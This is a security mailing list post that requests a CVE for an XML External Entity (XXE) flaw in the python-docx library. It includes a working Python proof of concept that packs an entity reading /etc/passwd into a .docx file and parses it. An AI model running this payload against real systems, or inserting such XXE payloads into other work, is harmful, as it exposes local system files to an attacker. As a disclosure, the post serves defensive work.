  oss-security - CVE request - python-docx - XXE            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Tue, 28 Jun From: Pierre Ernst <pernst@...esforce.com> To: oss-security@...ts.openwall.com Subject: CVE request - python-docx - XXE  The python-docx package (https://github.com/python-openxml/python-docx) is vulnerable to XML External Entity attacks (XXE).  Version contains a fix.  I would like to thanks Steve Canny for the prompt response.  The following POC has been tested on version  Older versions of the package might be vulnerable as well.   import docx import zipfile import tempfile import os  # define malicious XML xml_string = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <!DOCTYPE w:document [   <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]> <w:document xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w10="urn:schemas-microsoft-com:office:word" <w:body> <w:p> <w:pPr> <w:pStyle w:val="Normal" /> <w:rPr></w:rPr> </w:pPr> <w:r> <w:rPr></w:rPr> <w:t> Pierre Ernst, Salesforce --[&xxe;]-- </w:t> </w:r> </w:p> <w:p> <w:pPr> <w:pStyle w:val="Normal" /> <w:rPr></w:rPr> </w:pPr> <w:r> <w:rPr></w:rPr> <w:t></w:t> </w:r> </w:p> <w:sectPr> <w:type w:val="nextPage" /> <w:pgSz /> <w:pgMar w:header="0" w:footer="0" w:gutter="0" /> <w:pgNumType w:fmt="decimal" /> <w:formProt w:val="false" /> <w:textDirection w:val="lrTb" /> </w:sectPr> </w:body> </w:document>'''  # source: def updateZip(zipname, filename, data):     # generate a temp file     tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))     os.close(tmpfd)      # create a temp copy of the archive without filename     with zipfile.ZipFile(zipname, 'r') as zin:         with zipfile.ZipFile(tmpname, 'w') as zout:             for item in zin.infolist():                 if item.filename != filename:                     zout.writestr(item, zin.read(item.filename))      # replace with the temp archive     os.remove(zipname)     os.rename(tmpname, zipname)      # now add filename with its new data     with zipfile.ZipFile(zipname, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:         zf.writestr(filename, data)  # update legit docx file with malicious XML updateZip('whatever.docx', 'word/document.xml', xml_string)  # process with python-docx document = docx.Document('whatever.docx') print '\n\n'.join([paragraph.text for paragraph in document.paragraphs])     --  Pierre Ernst Salesforce  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      